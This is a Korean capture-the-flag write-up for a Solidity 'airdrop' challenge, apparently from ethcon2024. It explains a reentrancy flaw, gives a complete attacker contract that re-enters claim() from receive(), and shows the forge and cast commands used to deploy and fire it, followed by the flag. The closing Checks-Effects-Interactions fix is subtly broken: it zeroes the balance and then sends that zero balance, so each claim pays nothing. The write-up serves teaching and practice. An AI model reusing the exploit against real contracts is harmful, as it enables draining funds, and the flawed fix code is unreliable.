# Intermediate: 2. airdrop



**Mission**

Reentrancy attacks are a well-known and critical vulnerability in smart contract development. Every Solidity developer must be vigilant to avoid such issues in their contracts - [contract](https://sepolia.scrollscan.com/address/0x5A2023EF8938Fc8CBBC9356E988415970e755B46)

```solidity
pragma solidity =0.8.27;

contract Airdrop {
    uint256 totalDrop;
    mapping(address user => bool isDone) public done;
    mapping(address user => uint256 balance) public balances;
    mapping(address user => uint256 claimed) public claimed;
    mapping(address user => bool hasFlag) public flag;

    function airdrop() external {
        require(done[msg.sender] == false, "already received the airdrop.");
        balances[msg.sender] += 1 wei;
        done[msg.sender] = true;
        totalDrop++;
    }

    function claim() external {
        require(balances[msg.sender] > 0, "no balance to claim");
        claimed[msg.sender] += 1 wei;
        payable(msg.sender).call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;
    }

    function buyFlag(address buyer) external {
        require(flag[buyer] == false, "already bought flag");
        require(claimed[msg.sender] == 10 wei, "not enought to buy flag");
        claimed[msg.sender] = 0;
        flag[buyer] = true;
    }

    receive() external payable {}
    fallback() external payable {}
}
```

buyFlag의 조건을 보면 claimed가 10wei여야 한다.

claimed는 claim 함수에서 1wei씩 증가한다.

```solidity
    function claim() external {
        require(balances[msg.sender] > 0, "no balance to claim");
        claimed[msg.sender] += 1 wei;
        payable(msg.sender).call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;
    }
```

우리는 이 함수를 호출하기 위해 balances가 0보다 커야 한다.

balances는 airdrop 함수에서 증가한다.

```solidity
    function airdrop() external {
        require(done[msg.sender] == false, "already received the airdrop.");
        balances[msg.sender] += 1 wei;
        done[msg.sender] = true;
        totalDrop++;
    }
```

airdrop  함수는 done으로 체크해 한 msg.sender당 한 번 호출할 수 있다.

즉 유저는 balances를 1wei만 올릴 수 있다. 

여기서 우리는 airdrop을 호출해 balances를 1wei로 만들어 claim 함수는 호출할 수 있게 되었다. 그러나 claim 함수 마지막에 balances를 0으로 초기화한다. 즉 claimed도 결국 1 wei밖에 올리지 못할 것 처럼 보인다. 어떻게 문제를 해결할 수 있을까?

그 정답은 claim 함수에서 msg.sender에게 call 함수로 이더를 보내는 과정에서 찾을 수 있다. 

솔리디티에서, 컨트랙트가 이더를 받기 위해서는 receive라는 특별한 함수가 구현되어 있어야 한다. 그런데 만약 receive 함수에서 claim함수를 재호출한다고 생각해보자. 

그러면 call 함수 밑에 있는 

```solidity
balances[msg.sender] = 0;
```

가 수행되기 전에 claim이 재호출되어, 아직 balances가 줄어들지 않아 다시한번 claimed를 증가시킬 수 있다. 그럼 다시 call로 이더를 보낼 때 또 한번 receive에서 claim 함수를 호출하는 과정을 10번 반복하면, 우리는 claimed를 10wei로 올릴 수 있게 된다.

이러한 공격을 reentrancy attack이라고 한다. 

문제 해결을 위해 디렉토리를 만들자

```solidity
forge init airdrop
```

그 후, airdrop/src에 Solve.sol을 생성한 수 아래와 같이 공격 코드를 작성한다.

```solidity
pragma solidity =0.8.27;

interface iAirdrop{
	function claimed(address) external returns(uint);
	function airdrop() external;
	function claim() external;
	function buyFlag(address) external;
}

contract Solve{
	iAirdrop target;

	function exploit(address _target) public{
		target = iAirdrop(_target);
		
		target.airdrop();
		target.claim();
		target.buyFlag(tx.origin);
	}

	receive() external payable{
		if(target.claimed(address(this)) != 10 wei){
			target.claim();
		}
	}
}
```

이제 컨트랙트를 deploy하고, 공격을 수행해보자.

create contract:

```solidity
forge create Solve --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

result:

```solidity
Deployer: 0x4C5F15604c4B63EcBe4DFfA125879e0CC278711b
Deployed to: 0x1dCF48ACE0ff7A96C27BA358Be2bB1555e99d9C3
Transaction hash: 0x52b282164013f970196e940830fc5192e80dd98be58b83c96b215d078232e9ab
```

exploit:

```solidity
cast send 0x1dCF48ACE0ff7A96C27BA358Be2bB1555e99d9C3 "exploit(address)" 0x5A2023EF8938Fc8CBBC9356E988415970e755B46 --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY 
```

이렇게 공격에 성공해 Flag를 얻을 수 있다. 재진입 공격은 이더리움에서 가장 대표적인 해킹 중 하나이다.(The Dao Hack) 그렇다면 어떻게 reentrancy attack을 막을 수 있을까?

여러 방법이 있지만 그 중 대표적은 것은 CEI Pattern을 적용하는 것이다. 이는 Checks-Effects-Interactions Pattern의 약자로 먼저 조건을 검사한 후(Check) 상태를 변경하고(Effect) 그 다음에 다른 컨트랙트와 상호작용(Interaction)하는 것을 의미한다. 즉 우리는 call 함수를 통해 다른 컨트랙트와 interaction하게 되는데, 이 interaction 다음에 Effect, 즉 blanaces를 call 뒤에서 변경하는 것이  문제인 것이다. CEI Pattern을 적용해 interaction보다 effect를 먼저 수행하여 재진입 공격을 방지할 수 있다. 아래는 CEI Pattern을 적용한 샘플 코드이다.

```solidity
pragma solidity =0.8.27;

contract Airdrop {
    uint256 totalDrop;
    mapping(address user => bool isDone) public done;
    mapping(address user => uint256 balance) public balances;
    mapping(address user => uint256 claimed) public claimed;
    mapping(address user => bool hasFlag) public flag;

    function airdrop() external {
        require(done[msg.sender] == false, "already received the airdrop.");
        balances[msg.sender] += 1 wei;
        done[msg.sender] = true;
        totalDrop++;
    }

    function claim() external {
        // check
        require(balances[msg.sender] > 0, "no balance to claim");
        // effect
        claimed[msg.sender] += 1 wei;
        balances[msg.sender] = 0;
        // interaction
        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "claim() Failed...");
    }

    function buyFlag(address buyer) external {
        require(flag[buyer] == false, "already bought flag");
        require(claimed[msg.sender] == 10 wei, "not enought to buy flag");
        claimed[msg.sender] = 0;
        flag[buyer] = true;
    }

    receive() external payable {}
    fallback() external payable {}
}
```

우리는 balances를 call 전에 먼저 0으로 만듦으로써, 재진입 공격을 방지할 수 있게 된다. 만약 모종의 이유로 call에서 에러가 난다면 require로 revert 시켜 변경된 balances를 원상태로 되돌릴 수 있다.

Flag:

```solidity
ethcon2024{https://blog.Chain.Link/reentrancy-attacks-and-the-dao-hack/}
```